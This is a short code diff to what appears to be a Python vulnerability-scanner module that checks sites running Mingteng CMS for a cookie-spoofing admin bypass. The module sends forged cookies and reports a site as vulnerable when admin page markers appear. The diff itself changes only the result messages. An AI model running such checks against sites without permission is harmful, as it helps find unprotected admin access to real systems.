@@ -27,11 +27,13 @@ class mingteng_cookie_deception_BaseVerify:
             req = sess.get(vulnurl, headers=headers, cookies=mycookies, timeout=10, verify=False)
             if r"Admin" in req.text and r"SysSet/Default.aspx" in req.text:
                 cprint("[+]存在明腾cms cookie欺骗漏洞...(高危)\tpayload: "+vulnurl+"\t设置cookies为: "+str(mycookies), "red")
-            if r"Admin" in req.text and r"PassWords.aspx" in req.text:
+            elif r"Admin" in req.text and r"PassWords.aspx" in req.text:
                 cprint("[+]存在明腾cms cookie欺骗漏洞...(高危)\tpayload: "+vulnurl+"\t设置cookies为: "+str(mycookies), "red")
+            else:
+                cprint("[-]不存在mingteng_cookie_deception漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
